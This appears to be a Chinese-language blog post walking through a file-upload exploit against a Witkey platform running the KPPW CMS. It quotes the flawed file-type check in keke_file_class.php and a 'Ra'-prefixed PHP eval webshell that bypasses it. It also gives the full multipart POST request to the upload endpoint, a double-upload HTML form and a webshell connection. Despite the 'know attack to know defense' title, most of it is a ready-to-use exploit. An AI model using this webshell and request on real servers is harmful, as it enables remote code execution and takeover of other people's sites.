# 未知攻焉知防-文件上传
文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。
## 目标站是一个威客平台:
进行信息收集发下该平台系统是kppw 建站系统</br>
曾经披露处相关的文件上传漏洞</br>
寻找相应版本的源码</br>
漏洞位于/lib/helper/keke_file_class.php 138~158行</br> 
```
static function get_file_type($file_path, $ext = '') {
		$fp = fopen ( $file_path, 'r' );
		$bin = fread ( $fp, 2 );
		fclose ( $fp );
		$strInfo = @unpack ( "C2chars", $bin );
		$typeCode = intval ( $strInfo ['chars1'] . $strInfo ['chars2'] );
		$fileType = 'unknown';
		$typeCode == '3780' && $fileType = "pdf";
		$typeCode == '6787' && $fileType = "swf";
		$typeCode == '7784' && $fileType = "midi";
		$typeCode == '7790' && $fileType = "exe";
		$ext == 'txt' && $fileType = "txt";
		in_array ( $typeCode, array ('8297', '8075' ) ) && $fileType = $ext; 
		if (in_array ( $typeCode, array ('255216', '7173', '6677', '13780' ) )) { 
			in_array ( $ext, array ('jpg', 'gif', 'bmp', 'png', 'jpeg' ) ) and $fileType = $ext or $fileType = 'jpg';
		}
		if ($typeCode == '208207') { 
			in_array ( $ext, array ('wps', 'ppt', 'dot', 'xls', 'doc', 'docx' ) ) and $fileType = $ext or $fileType = 'doc';
		}
		return $fileType;
	}
```
1.$bin = fread($fp,2) 取出两个字符</br>
2.unpack() 函数从二进制字符串对数据进行解包。</br>
3.typeCode值在数组(8297,8075)中则 fileType取得$ext 后缀名(当上传.php文件时 $ext=php)</br>
4.而 Ra 经过unpack()函数处理正好是 8297</br>
构造一句话上传木马</br>
```
Ra<?php @eval($_POST['A']);?>
```
上传到/index.php?do=ajax&view=upload&file_type=big&filename=filename</br>
可用burpsuite上传 (POST)</br>
```
Content-Type: multipart/form-data; boundary=---------------------------41184676334
Content-Length: 210
Cookie: PHPSESSID=d5b313od6avhlohidiva6afin3
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------41184676334
Content-Disposition: form-data; name="filename"; filename="1.php"
Content-Type: jpg

Ra<?php @eval($_POST['A']);?>
-----------------------------41184676334--"""
```
![3.jpg](https://i.loli.net/2019/06/10/5cfdfaa9795ff78469.jpg)</br>
这里有个双文件上传html</br>
```

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 TRANSITIONAL//EN">
<!-- saced from url=(0055)http://www.xxx.com/upfile_photo.asp -->
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charest=gb2312">
<STYLE type=text/css>BOOY{
FONT-SIZE: 9pt; BACKGROUND-COLOR: #e1f4ee
}
.tx1{
BORDER-RIGHT:#000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 9pt; BORDER
}
</STYLE>

<META content="MSHTML 6.00.2800.1400" name=GENERATOR></HEAD>
<BODY leftMargin=0 topMargin=0>
<FORM name=form1 action="http://www.xxx.com/index.php?do=ajax&view=upload&file_type=big&filename=filename" method=post
encTYpe=multipart/form-data><INPUT class=tx1 type=file size=30 name=FileName><INPUT
class=tx1 type=file size=30 name=FileName1> <INPUT style="BORDER-RIGHT:rgb(88,88,88)
double;BORDER-TOP: rgb(88,88,88) 1px double; FONT-WEIGHT: normal; FONT-SIZE:9pt;BOR
LEFT: rgb(88,88,88) 1px double; LINE-HEIGHT: normal; BORDER-BOTTOM: rgb(88,88,88)1PX
double; FONT-STYLE: normal; FONT-BARIANT: normal" type=submit value=上传 name=submit>
<INPUT id=photoUr1ID type=hidden value=0 name=photoUr1ID> </FORM></BODY></HTML>
```
### 蚁剑连接
![1.jpg](https://i.loli.net/2019/06/10/5cfdfaa9af4b835160.jpg)</br>
